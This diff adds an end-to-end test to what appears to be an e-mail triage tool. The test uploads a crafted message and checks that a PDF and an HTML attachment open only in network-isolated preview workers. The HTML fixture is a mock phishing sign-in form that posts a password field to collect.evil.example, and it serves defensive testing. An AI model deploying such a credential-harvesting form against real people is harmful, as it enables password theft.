@@ -397,6 +397,71 @@ test('a reported e-mail is triaged: verdict, sandboxed body, attachment sent to 
   await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice.pdf.exe')
 })
 
+test('attachments are previewed by the isolated workers', async () => {
+  const pdf =
+    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
+    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
+  const html =
+    '<html><head><title>Sign in</title></head><body><form action="https://collect.evil.example/p">' +
+    '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
+  const eml = [
+    'From: Billing <billing@invoices.example>',
+    'To: m.rossi@contoso.example',
+    'Subject: Statement and secure link',
+    'MIME-Version: 1.0',
+    'Content-Type: multipart/mixed; boundary="b2"',
+    '',
+    '--b2',
+    'Content-Type: text/plain',
+    '',
+    'See the attached statement.',
+    '--b2',
+    'Content-Type: application/pdf; name="statement.pdf"',
+    'Content-Disposition: attachment; filename="statement.pdf"',
+    'Content-Transfer-Encoding: base64',
+    '',
+    Buffer.from(pdf).toString('base64'),
+    '--b2',
+    'Content-Type: text/html; name="secure.html"',
+    'Content-Disposition: attachment; filename="secure.html"',
+    'Content-Transfer-Encoding: base64',
+    '',
+    Buffer.from(html).toString('base64'),
+    '--b2--',
+    '',
+  ].join('\r\n')
+  await page.locator('nav[aria-label="Analysis tabs"]').getByText('Mail Analysis').click()
+  await page
+    .getByRole('button', { name: 'Upload e-mails' })
+    .locator('input[type=file]')
+    .setInputFiles({ name: 'statement.eml', mimeType: 'message/rfc822', buffer: Buffer.from(eml) })
+  await page.getByRole('list', { name: 'Messages' }).getByText('Statement and secure link').click()
+  await page.getByRole('tab', { name: /^Attachments/ }).click()
+  const preview = page.getByRole('button', { name: 'Preview' })
+  const browse = page.getByRole('button', { name: 'Open in isolated browser' })
+  if (process.env.E2E_DOCVIEW_URL) {
+    await preview.click()
+    await expect(page.getByRole('img', { name: 'Page 1 of statement.pdf' })).toBeVisible({ timeout: 60_000 })
+    await page.keyboard.press('Escape')
+  } else {
+    await expect(preview).toBeDisabled()
+  }
+  if (process.env.E2E_BROWSER_URL) {
+    await browse.click()
+    await page
+      .getByRole('dialog', { name: 'Open in the isolated browser' })
+      .getByRole('button', { name: 'Open' })
+      .click()
+    const remote = page.getByRole('dialog', { name: /^Isolated browser/ })
+    await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
+    await expect(remote).toContainText('no network')
+    await expect(remote).toContainText(/request(s)? refused/)
+    await remote.getByRole('button', { name: 'Close' }).click()
+  } else {
+    await expect(browse).toBeDisabled()
+  }
+})
+
 test('the API is reachable through the same origin', async ({ request }) => {
   const health = await request.get('/api/health')
   expect(health.ok()).toBeTruthy()
